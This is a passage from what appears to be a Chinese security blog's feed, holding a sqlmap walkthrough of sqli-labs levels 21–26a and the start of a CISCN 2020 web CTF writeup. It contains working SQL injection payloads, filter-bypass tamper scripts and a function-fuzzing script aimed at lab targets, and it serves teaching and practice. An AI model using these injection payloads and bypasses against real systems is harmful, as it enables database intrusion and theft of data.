a random blank character from a valid <span class="hljs-built_in">set</span> of alternate characters* space2mssqlhash.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a pound character (<span class="hljs-string">&#x27;#&#x27;</span>) followed by a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)* space2mysqlblank.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a random blank character from a valid <span class="hljs-built_in">set</span> of alternate characters* space2mysqldash.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a dash comment (<span class="hljs-string">&#x27;--&#x27;</span>) followed by a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)* space2plus.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with plus (<span class="hljs-string">&#x27;+&#x27;</span>)* space2randomblank.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a random blank character from a valid <span class="hljs-built_in">set</span> of alternate characters* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart* unmagicquotes.py - Replaces quote character (<span class="hljs-string">&#x27;) with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)</span><span class="hljs-string">* uppercase.py - Replaces each keyword character with upper case value (e.g. select -&gt; SELECT)</span><span class="hljs-string">* varnish.py - Appends a HTTP header &#x27;</span>X-originating-IP<span class="hljs-string">&#x27; to bypass Varnish Firewall</span><span class="hljs-string">* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment</span><span class="hljs-string">* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment</span><span class="hljs-string">* xforwardedfor.py - Append a fake HTTP header &#x27;</span>X-Forwarded-For<span class="hljs-string">&#x27; (and alike)</span><span class="hljs-string">[07:50:31] [WARNING] you haven&#x27;</span>t updated sqlmap <span class="hljs-keyword">for</span> more than 136 days!!!</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-21/index.php --cookie=<span class="hljs-string">&quot;uname=admin&quot;</span> --dbs --thread 10 --level 2  --tamper <span class="hljs-string">&quot;base64encode.py&quot;</span> --batch</code></pre></div><p>报错注入、时间盲注、bool盲注</p><div class="hljs code-wrapper"><pre><code class="hljs sh">Cookie parameter <span class="hljs-string">&#x27;uname&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:---Parameter: uname (Cookie)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: uname=admin<span class="hljs-string">&#x27;) AND 5369=5369 AND (&#x27;</span>iQxR<span class="hljs-string">&#x27; LIKE &#x27;</span>iQxR    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: uname=admin<span class="hljs-string">&#x27;) AND (SELECT 7756 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT (ELT(7756=7756,1))),0x71717a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (&#x27;</span>XAYM<span class="hljs-string">&#x27; LIKE &#x27;</span>XAYM    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: uname=admin<span class="hljs-string">&#x27;) AND (SELECT 4840 FROM (SELECT(SLEEP(5)))xHLI) AND (&#x27;</span>NCtt<span class="hljs-string">&#x27; LIKE &#x27;</span>NCtt    Type: UNION query    Title: MySQL UNION query (random number) - 3 columns    Payload: uname=-1690<span class="hljs-string">&#x27;) UNION ALL SELECT 7354,7354,CONCAT(0x71626b7071,0x436d455544674777774e596b4d736d666d41514e784369594447524264716e6f6b4f444e52657454,0x71717a7871)#</span><span class="hljs-string">---</span><span class="hljs-string"></span></code></pre></div><h1 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h1><p>与上一关没有太大区别，payload一致</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:---Parameter: uname (Cookie)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: uname=admin<span class="hljs-string">&quot; AND 2420=2420 AND &quot;</span>oiis<span class="hljs-string">&quot;=&quot;</span>oiis    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: uname=admin<span class="hljs-string">&quot; AND (SELECT 3162 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3162=3162,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &quot;</span>KDER<span class="hljs-string">&quot;=&quot;</span>KDER    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: uname=admin<span class="hljs-string">&quot; AND (SELECT 3871 FROM (SELECT(SLEEP(5)))FnVE) AND &quot;</span>GAqW<span class="hljs-string">&quot;=&quot;</span>GAqW    Type: UNION query    Title: MySQL UNION query (random number) - 3 columns    Payload: uname=-9694<span class="hljs-string">&quot; UNION ALL SELECT CONCAT(0x7176766a71,0x534b4a6c6748675549714b5253726363584546487753484c4a6a584c7745506b736d5461417a5072,0x7171787871),2413,2413#</span><span class="hljs-string">---</span><span class="hljs-string"></span></code></pre></div><h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>从less23开始加入一些过滤，这里可以使用内置tamper或者自己编写的tamper进行绕过，这一关只是过滤了注释符，闭合是可以的</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-23/index.php?id=1  --dbs --thread 10 --batch</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&#x27; AND 4202=4202 AND &#x27;</span>oxkU<span class="hljs-string">&#x27;=&#x27;</span>oxkU    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 1312 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(1312=1312,1))),0x7170627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;</span>CjmC<span class="hljs-string">&#x27;=&#x27;</span>CjmC    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 6430 FROM (SELECT(SLEEP(5)))EFyw) AND &#x27;</span>hGlI<span class="hljs-string">&#x27;=&#x27;</span>hGlI---</code></pre></div><h1 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h1><p>24关为二次注入绕过登录限制。这里暂时不用sqlmap了</p><p>关于sqlmap和自定义tamper利用二次注入的大神文章也有：</p><ul><li><a href="https://www.freebuf.com/articles/web/142963.html">使用Burp和自定义Sqlmap Tamper利用二次注入漏洞</a></li><li><a href="https://xz.aliyun.com/t/3010">记一份SQLmap使用手册小结（一）</a></li></ul><p>或者使用sqlmap 的二次注入功能</p><p>参数：<code>–second-order</code></p><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p><p><code>–second-order</code>后面跟一个判断页面的URL地址。</p><h1 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h1><p>这一关主要是绕过or 和 and 过滤，替换方法有如下：</p><ul><li>（1）大小写变形 Or,OR,oR </li><li>（2）编码，hex，urlencode </li><li>（3）添加注释/<em>or</em>/ </li><li>（4）利用符号 and=&amp;&amp; or=||</li></ul><p>sqlmap 对于or和and 替换成 &amp;&amp; 与 || 有内置tamper symboliclogical.py</p><p>没有加tamper时，显示无法注入</p><p>加上之后，可以成功，但是并没有返回所有数据库，显示在查询数据库数量的时候出现错误</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-25/index.php?id=1  --dbs --thread 10 --batch --tamper <span class="hljs-string">&quot;symboliclogical.py&quot;</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&#x27; AND 2505=2505 AND &#x27;</span>XqwA<span class="hljs-string">&#x27;=&#x27;</span>XqwA    Type: error-based    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: id=1<span class="hljs-string">&#x27; AND EXTRACTVALUE(2208,CONCAT(0x5c,0x7176787671,(SELECT (ELT(2208=2208,1))),0x716b627671)) AND &#x27;</span>TFVC<span class="hljs-string">&#x27;=&#x27;</span>TFVC    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 3398 FROM (SELECT(SLEEP(5)))PPqA) AND &#x27;</span>xghV<span class="hljs-string">&#x27;=&#x27;</span>xghV---</code></pre></div><h1 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h1><p>payload与上一关一致，但是也无法获取数据库数量：[08:50:10] [ERROR] unable to retrieve the number of databases</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-25a/index.php?id=1  --dbs --thread 5 --batch --tamper <span class="hljs-string">&quot;symboliclogical.py&quot;</span> -D <span class="hljs-string">&quot;security&quot;</span> --tables</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 6237=6237    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1 AND (SELECT 6319 FROM (SELECT(SLEEP(5)))wIaO)---</code></pre></div><h1 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h1><p>这一关主要考察过滤空格的绕过，有些特殊字符在windows下apache无法解析。</p><ul><li>%09 TAB 键（水平） </li><li>%0a 新建一行 </li><li>%0c 新的一页 </li><li>%0d return 功能 </li><li>%0b TAB 键（垂直） </li><li>%a0 空格</li><li>/**/</li><li>()</li></ul><p>这一关结合了25，将空格，or，and,/*,#,–,/等各种符号过滤</p><p>直接跑无法成功，加上tamper  space2comment.py 可以把’ ‘ 编程 ‘/**/‘ ，也可以使用space2mysqlblank.py，但是后者无法检测出漏洞。此处为我的环境原因，可能无法解析如上的一些特殊字符</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --current-db --thread 5 --tamper <span class="hljs-string">&quot;space2comment.py;symboliclogical.py&quot;</span> --batch --technique E -v 3</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 1562 HTTP(s) requests:---Parameter: id (GET)    Type: error-based    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: id=1<span class="hljs-string">&#x27; AND EXTRACTVALUE(5063,CONCAT(0x5c,0x716b7a7671,(SELECT (ELT(5063=5063,1))),0x71767a6a71)) AND &#x27;</span>PxYC<span class="hljs-string">&#x27;=&#x27;</span>PxYC    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)    Payload: id=1<span class="hljs-string">&#x27; AND SLEEP(5) AND &#x27;</span>mExo<span class="hljs-string">&#x27;=&#x27;</span>mExo---</code></pre></div><p>尽管获得了注入点和方式，但是却无法获取到数据库，估计与tamper的处理有所关系。</p><p>使用 -v 3 参数获取发送的payload</p><div class="hljs code-wrapper"><pre><code class="hljs sh">1<span class="hljs-string">&#x27;/**/%26%26/**/EXTRACTVALUE(9494,CONCAT(0x5c,0x716b7a7671,(SELECT/**/REPEAT(0x38,8)),0x71767a6a71))/**/%26%26/**/&#x27;</span>DeJl<span class="hljs-string">&#x27;=&#x27;</span>DeJl</code></pre></div><p>可以看出sqlmap在处理空格替换的时候没有处理好最后一个单引号，连接起来后可能因为mysql版本问题或者是字符解析问题，有些字符无法奏效。看来上面成功检测漏洞实际上是假象，使用上面的payload并不能奏效。</p><p>尝试自己写tamper，将其修改</p><p>先手工测试一下报错注入：</p><p><code>id=2&#39;&lt;&gt;(select(updatexml(1,concat(0x2b,version(),0x2b),1)))&lt;&gt;&#39;1</code></p><p>接下来就是在sqlmap中添加前后缀，</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-26/index.php?id=1  --dbs --thread 5 --tamper <span class="hljs-string">&quot;symboliclogical.py;space2comment.py&quot;</span> --prefix <span class="hljs-string">&quot;2&#x27;&lt;&gt;(&quot;</span> --suffix <span class="hljs-string">&quot;)&lt;&gt;&#x27;1&quot;</span>  --batch -v 3 --technique E</code></pre></div><p>但是无法奏效，查阅资料后发现是/**/只对特定的mysql版本有效（难怪报错的时候给我报个连着的select和version）</p><p>查看了一下sqlmap对updatexml的支持：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">2<span class="hljs-string">&#x27;&lt;&gt;((UPDATEXML(1474,CONCAT(0x2e,0x7176786a71,(SELECT/**/REPEAT(0x34,64)),0x7170767171),5807)))&lt;&gt;&#x27;</span>1</code></pre></div><p>中间换成(SELECT(REPEAT(0x34,64)))就可以成功回显了。</p><p>这个时候使用sqlmap其实作用已经不大了，毕竟工具是死的，手工编写一些脚本可能更加有效。</p><p>想要修改的话可以修改源码，参考上面的sqlmap自定义去添加自定义payload比较好</p><p>由于空格过滤后别的字符又无法解析，所以这里将空格过滤注释掉后可以成功注入</p><h1 id="less26-1"><a href="#less26-1" class="headerlink" title="less26"></a>less26</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-26a/index.php?id=1  --dbs --thread 5 --tamper <span class="hljs-string">&quot;symboliclogical.py&quot;</span> --prefix <span class="hljs-string">&quot;&#x27;)&lt;&gt;(&quot;</span> --suffix <span class="hljs-string">&quot;)&lt;&gt;(&#x27;1&quot;</span>  --batch -v 3  --tables -D <span class="hljs-string">&quot;security&quot;</span> --level 3</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">---Parameter: id (GET)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace    Payload: id=<span class="hljs-string">&#x27;)&lt;&gt;((CASE WHEN (1221=1221) THEN SLEEP(5) ELSE 1221 END))&lt;&gt;(&#x27;</span>1    Vector: (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)---</code></pre></div><p>能够成功检测出注入，但是ord因为有or所以被过滤掉了</p><p>如果将ord换成ascii即可绕过</p><p>编写tamper</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY__priority__ = PRIORITY.LOW<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):</span>    <span class="hljs-keyword">if</span> payload:        bypass_str = <span class="hljs-string">&quot;ascii&quot;</span>        payload=payload.replace(<span class="hljs-string">&quot;ORD&quot;</span>,bypass_str)    <span class="hljs-keyword">return</span> payload</code></pre></div><h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>安全工具</category>
      
      <category>sql注入</category>
      
      <category>sqlmap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>sql注入</tag>
      
      <tag>mysql</tag>
      
      <tag>sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【CISCN 2020初赛】writeup web部分</title>
    <link href="/2020/08/25/%E3%80%90CISCN-2020%E5%88%9D%E8%B5%9B%E3%80%91writeup-web%E9%83%A8%E5%88%86/"/>
    <url>/2020/08/25/%E3%80%90CISCN-2020%E5%88%9D%E8%B5%9B%E3%80%91writeup-web%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2020初赛-writeup-web部分"><a href="#CISCN2020初赛-writeup-web部分" class="headerlink" title="CISCN2020初赛 writeup web部分"></a>CISCN2020初赛 writeup web部分</h1><h2 id="web1：easyphp"><a href="#web1：easyphp" class="headerlink" title="web1：easyphp"></a>web1：easyphp</h2><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-comment">//题目环境：php:7.4.8-apache</span>    <span class="hljs-variable">$pid</span> = pcntl_fork();    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;could not fork&#x27;</span>);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>)&#123;        <span class="hljs-variable">$r</span>=pcntl_wait(<span class="hljs-variable">$status</span>); <span class="hljs-comment">//父进程等待子进程退出才会执行下面</span>        <span class="hljs-keyword">if</span>(!pcntl_wifexited(<span class="hljs-variable">$status</span>))&#123;            phpinfo();        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        highlight_file(<span class="hljs-keyword">__FILE__</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="hljs-string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;            call_user_func_array(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-literal">false</span>,<span class="hljs-literal">true</span>]);        &#125;        posix_kill(posix_getpid(), SIGUSR1);    &#125;</code></pre></div><p><strong>call_user_func_array</strong> </p><p>mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p><p>这里需要一个函数接收三个参数</p><p><strong>posix_kill</strong>(posix_getpid(), SIGUSR1);</p><ul><li><strong>posix_getpid</strong> 取得当前服务器进程号</li><li>许多程序使用<strong>SIGUSR1</strong>在线程和进程间进行同步</li></ul><p><strong>pcntl_wait</strong>($status);</p><ul><li>父进程等待子进程退出才会执行下面</li></ul><p><strong>pcntl_wifexited</strong> 进程控制函数</p><ul><li>检查状态代码是否代表一个正常的退出。</li><li>参数 status 是提供给成功调用 <a href="https://www.jc2182.com/php-pcntl-waitpid-ref/5106.html">pcntl_waitpid()</a> 时的状态参数。</li><li>正常退出时为true，其他情况返回 FALSE。</li><li>这里看到phpinfo需要非正常情况退出</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li> 猜测flag在phpinfo中，所以只需要让子进程错误退出即可继续执行父进程调用phpinfo</li><li>由于是调用函数，函数名可控，我们可以直接使用函数名进行fuzz。</li></ul><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>获取php内置函数名</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//题目环境：php:7.4.8-apache</span><span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">foreach</span> (get_defined_functions() <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)&#123;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> == <span class="hljs-string">&#x27;internal&#x27;</span>)&#123;        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$val</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;            <span class="hljs-variable">$result</span> = <span class="hljs-variable">$result</span>.<span class="hljs-variable">$v</span>.<span class="hljs-string">&quot; &quot;</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;func_name.txt&quot;</span>))&#123;    unlink(<span class="hljs-string">&quot;func_name.txt&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    file_put_contents(<span class="hljs-string">&quot;func_name.txt&quot;</span>,<span class="hljs-variable">$result</span>);&#125;</code></pre></div><p>发包脚本</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> requestss = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">zend_version func_num_args func_get_arg func_get_args strlen strcmp strncmp strcasecmp strncasecmp each error_reporting define defined get_class get_called_class get_parent_class method_exists property_exists class_exists interface_exists trait_exists function_exists class_alias get_included_files get_required_files is_subclass_of is_a get_class_vars get_object_vars get_class_methods trigger_error user_error set_error_handler restore_error_handler set_exception_handler restore_exception_handler get_declared_classes get_declared_traits get_declared_interfaces get_defined_functions get_defined_vars create_function get_resource_type get_loaded_extensions extension_loaded get_extension_funcs get_defined_constants debug_backtrace debug_print_backtrace gc_collect_cycles gc_enabled gc_enable gc_disable bcadd bcsub bcmul bcdiv bcmod bcpow bcsqrt bcscale bccomp bcpowmod jdtogregorian gregoriantojd jdtojulian juliantojd jdtojewish jewishtojd jdtofrench frenchtojd jddayofweek jdmonthname easter_date easter_days unixtojd jdtounix cal_to_jd cal_from_jd cal_days_in_month cal_info ctype_alnum ctype_alpha ctype_cntrl ctype_digit ctype_lower ctype_graph ctype_print ctype_punct ctype_space ctype_upper ctype_xdigit strtotime date idate gmdate mktime gmmktime checkdate strftime gmstrftime time localtime getdate date_create date_create_immutable date_create_from_format date_create_immutable_from_format date_parse date_parse_from_format date_get_last_errors date_format date_modify date_add date_sub date_timezone_get date_timezone_set date_offset_get date_diff date_time_set date_date_set date_isodate_set date_timestamp_set date_timestamp_get timezone_open timezone_name_get timezone_name_from_abbr timezone_offset_get timezone_transitions_get timezone_location_get timezone_identifiers_list timezone_abbreviations_list timezone_version_get date_interval_create_from_date_string date_interval_format date_default_timezone_set date_default_timezone_get date_sunrise date_sunset date_sun_info ereg ereg_replace eregi eregi_replace split spliti sql_regcase filter_input filter_var filter_input_array filter_var_array filter_list filter_has_var filter_id ftp_connect ftp_login ftp_pwd ftp_cdup ftp_chdir ftp_exec ftp_raw ftp_mkdir ftp_rmdir ftp_chmod ftp_alloc ftp_nlist ftp_rawlist ftp_systype ftp_pasv ftp_get ftp_fget ftp_put ftp_fput ftp_size ftp_mdtm ftp_rename ftp_delete ftp_site ftp_close ftp_set_option ftp_get_option ftp_nb_fget ftp_nb_get ftp_nb_continue ftp_nb_put ftp_nb_fput ftp_quit hash hash_file hash_hmac hash_hmac_file hash_init hash_update hash_update_stream hash_update_file hash_final hash_copy hash_algos hash_pbkdf2 mhash_keygen_s2k mhash_get_block_size mhash_get_hash_name mhash_count mhash iconv iconv_get_encoding iconv_set_encoding iconv_strlen iconv_substr iconv_strpos iconv_strrpos iconv_mime_encode iconv_mime_decode iconv_mime_decode_headers json_encode json_decode json_last_error json_last_error_msg mcrypt_ecb mcrypt_cbc mcrypt_cfb mcrypt_ofb mcrypt_get_key_size mcrypt_get_block_size mcrypt_get_cipher_name mcrypt_create_iv mcrypt_list_algorithms mcrypt_list_modes mcrypt_get_iv_size mcrypt_encrypt mcrypt_decrypt mcrypt_module_open mcrypt_generic_init mcrypt_generic mdecrypt_generic mcrypt_generic_end mcrypt_generic_deinit mcrypt_enc_self_test mcrypt_enc_is_block_algorithm_mode mcrypt_enc_is_block_algorithm mcrypt_enc_is_block_mode mcrypt_enc_get_block_size mcrypt_enc_get_key_size mcrypt_enc_get_supported_key_sizes mcrypt_enc_get_iv_size mcrypt_enc_get_algorithms_name mcrypt_enc_get_modes_name mcrypt_module_self_test mcrypt_module_is_block_algorithm_mode mcrypt_module_is_block_algorithm mcrypt_module_is_block_mode mcrypt_module_get_algo_block_size mcrypt_module_get_algo_key_size mcrypt_module_get_supported_key_sizes mcrypt_module_close odbc_autocommit odbc_binmode odbc_close odbc_close_all odbc_columns odbc_commit odbc_connect odbc_cursor odbc_data_source odbc_execute odbc_error odbc_errormsg odbc_exec odbc_fetch_array odbc_fetch_object odbc_fetch_row odbc_fetch_into odbc_field_len odbc_field_scale odbc_field_name odbc_field_type odbc_field_num odbc_free_result odbc_gettypeinfo odbc_longreadlen odbc_next_result odbc_num_fields odbc_num_rows odbc_pconnect odbc_prepare odbc_result odbc_result_all odbc_rollback odbc_setoption odbc_specialcolumns odbc_statistics odbc_tables odbc_primarykeys odbc_columnprivileges odbc_tableprivileges odbc_foreignkeys odbc_procedures odbc_procedurecolumns odbc_do odbc_field_precision preg_match preg_match_all preg_replace preg_replace_callback preg_filter preg_split preg_quote preg_grep preg_last_error session_name session_module_name session_save_path session_id session_regenerate_id session_decode session_encode session_start session_destroy session_unset session_set_save_handler session_cache_limiter session_cache_expire session_set_cookie_params session_get_cookie_params session_write_close session_status session_register_shutdown session_commit spl_classes spl_autoload spl_autoload_extensions spl_autoload_register spl_autoload_unregister spl_autoload_functions spl_autoload_call class_parents class_implements class_uses spl_object_hash iterator_to_array iterator_count iterator_apply constant bin2hex hex2bin sleep usleep time_nanosleep time_sleep_until flush wordwrap htmlspecialchars htmlentities html_entity_decode htmlspecialchars_decode get_html_translation_table sha1 sha1_file md5 md5_file crc32 iptcparse iptcembed getimagesize getimagesizefromstring image_type_to_mime_type image_type_to_extension phpinfo phpversion phpcredits php_sapi_name php_uname php_ini_scanned_files php_ini_loaded_file strnatcmp strnatcasecmp substr_count strspn strcspn strtok strtoupper strtolower strpos stripos strrpos strripos strrev hebrev hebrevc nl2br basename dirname pathinfo stripslashes stripcslashes strstr stristr strrchr str_shuffle str_word_count str_split strpbrk substr_compare strcoll substr substr_replace quotemeta ucfirst lcfirst ucwords strtr addslashes addcslashes rtrim str_replace str_ireplace str_repeat count_chars chunk_split trim ltrim strip_tags similar_text explode implode join setlocale localeconv soundex levenshtein chr ord parse_str str_getcsv str_pad chop strchr sprintf printf vprintf vsprintf fprintf vfprintf sscanf fscanf parse_url urlencode urldecode rawurlencode rawurldecode http_build_query readlink linkinfo symlink link unlink exec system escapeshellcmd escapeshellarg passthru shell_exec proc_open proc_close proc_terminate proc_get_status rand srand getrandmax mt_rand mt_srand mt_getrandmax getservbyname getservbyport getprotobyname getprotobynumber getmyuid getmygid getmypid getmyinode getlastmod base64_decode base64_encode password_hash password_get_info password_needs_rehash password_verify convert_uuencode convert_uudecode abs ceil floor round sin cos tan asin acos atan atanh atan2 sinh cosh tanh asinh acosh expm1 log1p pi is_finite is_nan is_infinite pow exp log log10 sqrt hypot deg2rad rad2deg bindec hexdec octdec decbin decoct dechex base_convert number_format fmod inet_ntop inet_pton ip2long long2ip getenv putenv getopt microtime gettimeofday uniqid quoted_printable_decode quoted_printable_encode convert_cyr_string get_current_user set_time_limit header_register_callback get_cfg_var magic_quotes_runtime set_magic_quotes_runtime get_magic_quotes_gpc get_magic_quotes_runtime error_log error_get_last call_user_func call_user_func_array call_user_method call_user_method_array forward_static_call forward_static_call_array serialize unserialize var_dump var_export debug_zval_dump print_r memory_get_usage memory_get_peak_usage register_shutdown_function register_tick_function unregister_tick_function highlight_file show_source highlight_string php_strip_whitespace ini_get ini_get_all ini_set ini_alter ini_restore get_include_path set_include_path restore_include_path setcookie setrawcookie header header_remove headers_sent headers_list http_response_code connection_aborted connection_status ignore_user_abort parse_ini_file parse_ini_string is_uploaded_file move_uploaded_file gethostbyaddr gethostbyname gethostbynamel gethostname dns_check_record checkdnsrr dns_get_mx getmxrr dns_get_record intval floatval doubleval strval boolval gettype settype is_null is_resource is_bool is_long is_float is_int is_integer is_double is_real is_numeric is_string is_array is_object is_scalar is_callable pclose popen readfile rewind rmdir umask fclose feof fgetc fgets fgetss fread fopen fpassthru ftruncate fstat fseek ftell fflush fwrite fputs mkdir rename copy tempnam tmpfile file file_get_contents file_put_contents stream_select stream_context_create stream_context_set_params stream_context_get_params stream_context_set_option stream_context_get_options stream_context_get_default stream_context_set_default stream_filter_prepend stream_filter_append stream_filter_remove stream_socket_client stream_socket_server stream_socket_accept stream_socket_get_name stream_socket_recvfrom stream_socket_sendto stream_socket_enable_crypto stream_socket_shutdown stream_socket_pair stream_copy_to_stream stream_get_contents stream_supports_lock fgetcsv fputcsv flock get_meta_tags stream_set_read_buffer stream_set_write_buffer set_file_buffer stream_set_chunk_size set_socket_blocking 